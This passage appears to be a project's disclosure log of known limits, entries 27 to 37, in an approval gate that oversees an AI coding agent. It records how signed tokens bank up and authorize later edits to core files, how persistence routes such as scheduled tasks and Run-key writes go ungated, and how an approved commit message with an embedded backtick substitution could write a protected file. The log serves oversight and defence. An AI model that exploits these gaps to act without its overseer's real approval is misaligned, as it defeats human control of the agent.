signing time. Any difference between staging and execution produces a new,
unrelated approval request rather than verifying against the original signature: a
different flag value, reordered arguments, an added redirect, a changed path
separator. This is intended and is not going to change. A token that survived
command mutation would not be an approval of *this* action, it would be a standing
permission slip.

The cost lands on the human, not the agent. Every mismatch asks for another
signature on something that from their side looks like the action they already
approved. A few repetitions of that and the natural response is to sign faster and
read less, which is the exact failure mode the gate exists to prevent. Limit 26
names the same corrosive dynamic arriving from a different direction.

Confirmed live, 2026-07-25. A signed request for an Ollama dispatch was followed by
a retry that changed only `tail -20` to `tail -25`, and that produced a new request
rather than reusing the signature.

The mitigation available today is an operating rule, not a code change: whatever
stages a signed command must reproduce it byte for byte at execution time and must
never improve it in between.

**Correction, 2026-07-25, same evening this entry was written.** The paragraph above
originally continued with a "candidate improvement to the gate itself, not built": a
denial that identifies itself as a variant of an already-staged request, so the human
can see they are being asked to re-approve a near-twin rather than to approve
something novel.

That is built, though **not shipped**, and the distinction is the point of this
correction. It is committed on the unmerged branch
`fix/token-freshness-and-variant-denial` (`fefb3d2`), which is four commits ahead of
`main`. Searching `main` for the function returns nothing. So it is live in the
working tree, active in any session running from it, and absent from every release.
An earlier version of this correction said "already shipped," which was the same
error one layer down: asserting state without checking which branch that state lives
on. See limit 29.

`buildDenialMessage()` calls `findSimilarStagedRequest()` and, on a match, prints a
`VARIANT OF staged request <id>` line **above** the reasoning, with the differing
region of both commands shown. Its own source comment names the three incidents from
2026-07-25 that motivated it, and one of them is the `tail -20` to `tail -25` retry
cited as this entry's live confirmation. So the entry used a shipped fix's own
motivating incident as evidence that the fix did not exist. The error was writing
about the gate's behaviour from the incident record instead of from the source.

Recorded here rather than quietly edited out, because a disclosure log that silently
repairs its own false claims is worth less than one that shows them. The general rule
it earns: **a claim that the gate does not do something requires reading the gate, not
reading what happened.**

Two genuine residuals, found while checking the above:

Similarity is deliberately crude and **excludes byte-identical priors** (`wasDetail
=== nowDetail` is skipped). That exclusion is right, because a prior whose token was
already signed and spent is not a variant of anything and calling it one would
mislead. The cost is that re-attempting an identical command stages a second request
with no hint that an unsigned identical one is already pending. A separate line for
that case, pointing at the existing request instead of the new one, would be a small
improvement and is not built.

Staged requests are **never pruned**. There were 185 by the morning of 2026-07-25 and
229 by that evening, one per denial, forever. The deny path caps its twin scan at the
25 newest so matching stays fast, but the directory itself grows without bound. Same
shape as the unbounded nonce log in limit 16, and neither has a cleanup path.

## 28. A grant is bound to one session, so it cannot pre-authorize a scheduled task

A grant is one signature over N enumerated requests, scoped to one session, with an
expiry and a shared action ceiling (limit 17). A recurring scheduled task, whether
cron, Task Scheduler, or a systemd timer, spawns a **new session on every firing**.
No grant issued once can therefore cover a job intended to run unattended on a
schedule. Each firing would need its own signature, which is unavailable by
definition when nobody is present to sign.

This is a structural gap, not an oversight in the grant schema, and it means the
honest rule for unattended work is that anything inherently gated cannot be
automated at all. It can only be prepared and left for a human.

One important refinement, because an earlier version of that conclusion was too
strong. It holds absolutely for **overnight**, where the operator is asleep and no
signature is possible at any price. It does not hold for **away**, where the
operator is out but reachable and signatures are merely latent. In away mode a job
can legitimately stage a gated action and wait, because someone will come. The
design does not need a new primitive to handle that; it needs to know which mode it
is in, and nothing in v1 records or reasons about operator mode.

No change to the grant machinery is proposed here. It lives in the non-delegable
core, so any change to it requires its own per-edit signature.

## 29. This file documents `main`, but lives in the tree of branches that change it

Found 2026-07-25 while correcting limit 27. The confession log sits in the same
working tree as the code it describes, so on any feature branch it is simultaneously
accurate for `main` and false for the checkout you are reading it in. There is nothing
in the file that says which.

The branch `fix/token-freshness-and-variant-denial`, four commits ahead of `main` at
the time of writing, demonstrates it. Three commits, all of them shipping code plus
tests, **none of them touching this file:**

- `fefb3d2` added an approval-token freshness window in `src/gate/index.js` with 128
  lines of new tests. Limit 16 still opens "An approval token has no expiry."
- `9d3ec36` added per-model cost attribution in `src/parser/index.js` with 211 lines
  of new tests, and names limits 4 and 13 in its own subject line. Limit 13 still
  reads "Per-model, per-harness cost attribution is not built."
- `13cc2e2` added portable receipt bundles so a chain verifies off the machine that
  wrote it. Limit 9 still reads "receipts do not verify across machines."

**The direction of the error matters and cuts both ways.** Overstating limits is the
safer failure: a reader who believes the system is weaker than it is takes more care,
not less, and nobody is harmed by a disclosure that has not yet been retracted. But it
is still a false statement of current state, and it corrodes the one property this
file exists to have. A log that is wrong in the flattering direction and a log that is
wrong in the unflattering direction are both logs you have to check the code to trust,
which is the whole thing it was supposed to save you from.

It also inverts the failure mode the confession loop was designed against. That design
worried about a system rewarded for closing entries, and answered it by rewarding
discovery instead. This is the other leak: **fixes landing without the disclosure
being updated, so closure happens in the code and never in the record.** Discovery
being the product does not help if closure is invisible.

Not fixed here, and deliberately not papered over by rewriting the four entries
tonight. Each one needs its fix read and its tests run before its entry is amended,
and amending a disclosure on the strength of a commit subject line would repeat the
exact mistake that produced limit 27's correction. Candidate fixes, none built: a CI
check that fails a PR touching `src/` without touching this file or explaining why; a
per-entry `status:` field naming the branch and commit a claim was last verified
against; or moving the log out of the code tree entirely so it can only describe
released behaviour.

Until then, read this file as a statement about `main`, and check `git log` before
trusting any entry in a feature checkout.

**Update 2026-07-26. The specific instance closed and the entry got worse, not
better.** `fix/token-freshness-and-variant-denial` merged into `main` this morning,
thirteen commits, suite green. So the branch this entry uses as its demonstration no
longer exists as a gap.

The class did not close. It inverted. While the fixes sat on a branch, limits 4, 9,
13 and 16 were stale *only in a feature checkout* and correct for `main`, which is
exactly what the last line above tells a reader to assume. **After the merge they are
stale on `main` itself**, which is the case that line offers no defence against. A
reader following this file's own instructions is now misled, where before they were
protected.

That is worth stating plainly because it is the sharper form of the problem: the
window between a fix landing and its disclosure being amended is not a branch-local
inconvenience, it is a period during which the log is confidently wrong about shipped
behaviour. Merging is what converts a private staleness into a public one, so **the
merge is the moment the amendment is owed**, not some later tidy-up. None of the
candidate fixes above would have caught this either; a CI check on `src/` would have
passed, since the merge commit touches this file's neighbours and not its claims.

## 30. Edit tokens are fungible per file, so signing twice builds a grant by hand

Found 2026-07-26, live, from a double-signing that was an accident.

`SIGNED_PARAMS` is `command`, `file_path`, `url`, `path`. For the `Edit` tool that
means the canonical request is **the path and nothing else**: the content being written
is not signed, deliberately, because binding a signature to `old_string` and
`new_string` would make every approval brittle and unreviewable. The SCOPE line in the
denial message says so honestly, "signs file_path only."

The consequence is not in that line. Because the request is only the path, **every edit
to a given file produces the same canonical request**, so every token for that file
validates against every other edit to it. Tokens are single-use by nonce, but they are
**interchangeable and they accumulate.** Sign the same path twice and the surplus token
sits in `pending-approvals/` and silently authorizes the next edit to that file,
whatever its content, whenever it happens, with no further review and no second look
from the operator. On `main`, where an approval has no expiry (limit 16), it waits
indefinitely.

**Why this is worse than it first sounds.** Delegation grants are *refused* on the
non-delegable core: `requestRefusalReason()` rejects any request naming a path
`classifyPath()` does not call grantable, so no single signature may cover repeated
operations on `src/gate`, `src/policy`, `src/chain`, `src/store`, `src/grant`, or
`bin/hook-*`. That refusal is correct and load-bearing.

But N single-use Edit tokens for a core path add up to precisely the grant that was
refused. Same effect, and strictly weaker in every respect that made the refusal safe:
no session binding, no expiry, no ceiling, and no chain-recorded enumeration of what
was authorized (limit 18 exists so a grant's contents are reconstructable; a pile of
loose tokens has no equivalent). **The control that stops one signature from covering
many core edits can be assembled by hand out of the primitive it is built from.**

Observed exactly this way: three edits to `bin/hook-pre-tool-use.js`, three denials,
two signatures, three edits applied. Receipts seq 585, 589, and 590 record three
`approved` decisions with three distinct approval nonces, so nothing was replayed and
the nonce layer worked exactly as designed. The gap is that the second signature was
never spent on the action the owner was looking at when they gave it.

Worth stating plainly because it inverts an instinct: the agent's own reading of this
was that a third edit had bypassed the gate, and the reasoning offered was a possible
nonce-replay hole in the core. The chain said otherwise in one read. **A gap found by
reading receipts is the third time on this project that the record has corrected an
inference the code invited.**

Not fixed. Candidate directions, none built and each with a cost: expire tokens
(already on an unmerged branch for other reasons, and it narrows the window without
closing it); refuse to stage a request whose canonical form already has an unspent
token on disk, so surplus tokens cannot exist; include a content digest in the signed
request for core paths only, accepting the brittleness limit 27 describes in exchange
for one-edit-one-signature on the files that matter most; or delete every remaining
token for a path once one is spent, on the theory that an operator approving an action
approved that action and not a credit balance. The last is the smallest and probably
the right one.

Until then: **for the non-delegable core, sign once per edit and never bank a
signature.** If a passphrase entry fails, confirm no token landed before signing again.

### Observed live state, 2026-07-26, and this is the part that matters

The paragraphs above describe a mechanism. Checked against the actual machine, the
mechanism has already accumulated. Token files are deleted when consumed, so every
file remaining in `pending-approvals/` is by construction **unspent, valid, and
non-expiring**. There were **eleven**, none of their nonces present in
`keys/approval-nonces.log`.

Two of the eleven authorize consequential actions: one registers a Windows scheduled
task, and one opens a GitHub pull request with a full body. Each will execute silently,
with no gate and no request, the moment its exact command string is next attempted.

This is limits 27 and 16 compounding into a state rather than a hazard. **A signature
burned by a one-character change does not evaporate; it banks.** Every retry that
restages instead of reusing leaves the original signed and idle, and with no expiry on
`main` it stays that way. Nothing counts them, nothing surfaces them, and the operator
has no view of the balance they have accrued.

Three consequences worth separating, because they have different fixes:

The **absence of a ledger** is the cheapest and largest gap. There is no command that
answers "what am I currently pre-authorizing." `npm run receipts` reports what
happened; nothing reports what is still permitted. That is a read-only feature and it
should exist before any of the harder fixes.

**Deleting a surplus token needs no signature and fails safe**, exactly as limit 19
argues for grants: removing an authorization only ever reduces capability. So cleanup
is available today and costs nothing. It just has to be known to be necessary.

**Expiry narrows this and does not close it.** A freshness window (on an unmerged
branch at time of writing) bounds how long a banked signature waits. It does not stop
one from existing, and a token spent inside its window is spent on whatever command
matches, not on the action the owner was looking at.

**Amended 2026-07-26.** Two of the three consequences above have moved, and the
parenthetical "on an unmerged branch at time of writing" is now false: the freshness
window is on `main`. The ledger this entry called "the cheapest and largest gap" is
built and shipped as `bin/tokens.js` / `npm run tokens`. Its first real run found one
live unspent token two minutes old, and the run this morning found zero live and one
expired, which is the intended steady state.

The third consequence stands unchanged and is the one to keep reading: **expiry still
does not close this.** A token spent inside its window is spent on whatever command
matches. The ledger makes the balance visible; it does not make a banked signature
mean what its signer meant. See limit 31 for what the ledger still cannot tell you.

## 31. The rule set reasons about actions taken now, and has no concept of actions scheduled for later

Found 2026-07-25, on the run that found it. Recorded here 2026-07-26 after it survived
a branch collision that nearly lost it: two branches independently numbered new entries
27 and 28, the merge kept the other pair, and this one was recovered from the discarded
side rather than from anyone remembering it.

Persisting a script to run later, unattended and repeatedly, is at least as
consequential as running it once. It outlives the session, it runs with nobody
watching, and it re-runs on a schedule the gate never sees again. There is no rule for
it.

`Register-ScheduledTask` **did** gate when it was observed, but only incidentally: the
command string happened to contain a `.ps1` path, so `opaque-exec` matched. **The gate
fired for the right reason by accident.** A task registered against a bare executable,
a `cmd /c` line, or an interpreter with an inline argument carries no script extension
and would very likely pass unremarked.

The same hole covers every other persistence surface on the machine: `schtasks`, `at`,
cron entries written through a tool call, systemd units, shell profile edits, `Run`-key
registry writes, login items. Limit 26 already noted that staging persistence through a
prose write is "a candidate for a path-based scope-escalation rule"; this is the same
gap reached from the other direction, and it is wider, because it needs no prose at
all.

The honest framing is that this is **a category the matcher does not model rather than
a verb it is missing**, which is why extending a verb list would not close it. A
`persistence` rule keyed on the known scheduling surfaces would raise the bar
considerably and would still inherit limit 21's ceiling: the rules match strings, not
intent, and a scheduler reached through a wrapper the matcher cannot see into stays
invisible.

**Live and load-bearing as of this writing.** This install has several S4U scheduled
tasks registered, and they are how unattended work runs here. Every one of them is the
exact class described above. Registering them was deliberate and authorized; the point
of the entry is that **the gate cannot distinguish that from the case where it was
neither**, which is the whole hazard and does not depend on when they run.

Not fixed in v1.

## 32. The authorization ledger cannot show which rule staged a token

Found 2026-07-26 by the unattended overnight pass, which went looking for the rule id
in the request files and reported its absence rather than assuming it was there.

`bin/tokens.js` reports every live, expired, and spent token in `pending-approvals/`,
closing the gap limit 30 named. It cannot report **which rule** (`self-mod`,
`opaque-exec`, and so on) staged a given token, because `stageRequest()` in
`bin/hook-pre-tool-use.js` writes only the action and its params to the request file,
never the matched rule id. The rule name exists only as an in-process variable at the
moment the gate evaluates the call, and is gone once the process exits.

Why it matters more than a missing display field: the ledger's job is to answer *what
am I currently pre-authorizing*, and a token's rule is the closest thing the system has
to **why** it needed authorizing. Without it, a reviewer sees a command and its age and
has to re-derive the hazard from the command string, which is the same work the gate
already did once and threw away.

Not fixed. The fix is small and has precedent: a sidecar at
`pending-approvals/rules/<id>.json`, written at staging time and read back the same way
`readPurpose()` already reads the `purpose` sidecar. Until then, a live token in the
ledger tells you what it would do and how old it is, not which rule put it there.

## 33. A signed command string is executed by a shell, so an approved commit message can run commands

Found 2026-07-26, by writing one. A commit message explaining why `bin/charter.js`
must be protected contained the text `` `echo x > bin/charter.js` `` as an example.
Inside a double-quoted `-m` argument in `bash`, backticks are **command
substitution**. Running that command would have created the exact file the message
argues must never be created unsigned, silently, as a side effect of describing the
hazard.

**The gate does not help here, and that is the entry.** A signature covers the whole
command string. Once the owner approves it, everything inside it runs under that
approval, including any `` ` `` or `$(...)` embedded in what looks like prose. The
matcher can flag the text — it did, which is how this surfaced — but flagging is not
the same as understanding, and an approved command is an approved command.

**Distinct from limit 26, and sharper.** Limit 26 is about prose being *scanned as
code* and producing false positives; the cost there is friction. This is prose that
*is* code, and the cost is execution under the owner's signature. The two look
similar in a denial message and are opposite in consequence.

**The messy part, recorded because it is the honest bit.** The fix was to escape the
backticks, which meant changing a command after it had been staged and signed —
directly against the byte-identical-retry rule that limit 27 exists to enforce. That
rule assumes the staged command is correct. When it is not, faithfully reproducing a
defect is the wrong reading, and the resolution is a fresh signature on the corrected
command plus clearing the old token, because an unspent token authorizing the
dangerous version is a live authorization to run it later (limit 30). Both were done.
**A rule that says never change a staged command needs an explicit exception for
"the staged command is unsafe", or it will eventually be used to argue for executing
something known to be wrong.**

Not fixed. Candidate mitigations, none built: refuse to stage any command containing
unquoted `` ` `` or `$(` outside single quotes; prefer `--file` for commit messages
so message text never becomes shell input; or render the staged command with
substitutions highlighted so the owner sees them as executable rather than as prose.
The first is a matcher and inherits limit 21; the second is a workflow change and is
probably the honest answer.

## 34. The self-mod matcher decides by path fragment, when a path could be resolved

Recorded 2026-07-26 alongside the `bin/` fix, as the better answer that was not taken.

`isSelfModEdit` matches by substring against a hand-maintained fragment list.
`core-paths.js` answers the same question by **resolving** the path and proving
containment, refusing anything it cannot place. Those are not equally good: the first
is a list someone must remember to update, the second is a decision procedure. The
`bin/` gap existed precisely because the list drifted from `CORE_DIRS`, and it was
closed by adding a smarter regex, which is a better list and still a list.

**The asymmetry that makes the better fix available:** `Edit`, `Write` and
`NotebookEdit` all carry a `file_path`, and **a path can be proven contained**. So
the edit path could call `classifyPath` and gate anything not `grantable`, deleting
the drift for file operations entirely. Commands cannot do this — deciding what a
shell command touches needs a grammar, not a resolver — so the fragment list stays
correct there and only there.

Not done because it couples `src/policy` to `src/grant`, and that coupling deserves
its own review rather than riding along with an incident fix. **The residual until
then:** a new core *directory* outside `src/` and `bin/` is non-delegable per
`core-paths.js` and ungated by self-mod until someone adds a fragment. The `src/`
side has a guard (`test/core-classification.test.js` fails on an unclassified
directory) and `bin/` is now covered by pattern. Anywhere else is still list-shaped,
and a list is only as good as the last person to remember it.

## 35. A gate decision carries no session id, so a denial cannot be attributed

Found 2026-07-26 building the cross-session view.

Every `gated-action` receipt written in `src/gate/index.js` (four call sites, lines
149, 167, 192 and 209) carries `decision`, `action`, `reason` or `approvalNonce`, and
`timestamp`. **None of them carries a session id.**

With one session running that costs nothing, because the denial obviously belongs to
whoever was there. With concurrent sessions it costs the question entirely: 57
denials were recorded on 2026-07-26 across six working sessions and **not one can be
attributed to the session that caused it.**

Attributing by timestamp is available and is not done, deliberately. Sessions overlap,
so the nearest-open heuristic is wrong often enough that a confident wrong answer
would be worse than a stated gap. `src/views/since.js` reports gate decisions in a
separate unattributed list and says why in its own output.

**Why it is not simply fixed:** the gate is called from the hook with an action
request, and the session id is available to the hook. Threading it through is a core
change to `src/gate`, which is one signature per edit and belongs in a reviewed
sitting rather than riding along with a view. Until then, denials are a timeline and
not a per-session fact.

## 36. An approved receipt records the tool, never the target

Found 2026-07-26 building the autograph ratio, by reading `src/gate/index.js:209`.

The approval receipt is `{ decision: 'approved', action, approvalNonce, timestamp }`.
`action` is the tool name. There is no path, no command string, no params, and no
digest of the request.

So the chain answers **that** a signature was spent and **on which tool**, and can
never answer **on what**. A signature cannot be matched to a charter item, a file, or
a command after the fact. This is not a missing feature; it is not derivable from the
record as it stands, and any tool claiming per-signature attribution would be
guessing.

`src/views/autograph.js` therefore attributes by charter **window** rather than per
signature, and states the reason in its own output rather than in a comment nobody
reads.

**The trade this preserves is real and should not be discarded casually.** The
approval token binds to the exact request, and the request never enters the chain, so
the chain leaks nothing about what was approved. Recording the target would make
attribution possible and would put command strings in the log, which limit 18 already
flags as a disclosure surface. The fix is a digest, not the string, and it is a core
change.

## 37. The chain accepts entries from writers outside this repository

Found 2026-07-26 while auditing receipt coverage.

Chain entries at seq 727 and 728 are `ledger-head` records carrying `limit_id`,
`limit_text_sha256`, `entry_count` and `head_hash`. **Nothing in this repository
writes them.** A search across every JavaScript file finds the string only in a
comment, a test, and the chain itself. They are produced by the attempt-ledger work,
which lives in a separate tree.

Two consequences.

**No in-repo enumeration of receipt types can claim completeness**, including
`docs/receipt-coverage.md`, which says so. A future audit has to re-derive the set
from a real chain rather than trust the document.

**And the outside writer uses a different discriminator.** Its rows are keyed by
`kind` and its fields are snake_case, where every payload written here uses `type` and
camelCase. Both readers in this repo checked only `type` and so labelled those rows
`unknown`; both were fixed the same day. That is the same class as reporting an absent
count as zero: a reader that knows one convention describes the other wrongly while
appearing to work.

There is nothing wrong with a chain that accepts entries from more than one producer.
The limit is that **the set of producers is not enumerated anywhere**, so the only
honest way to learn what is in a chain is to read that chain.
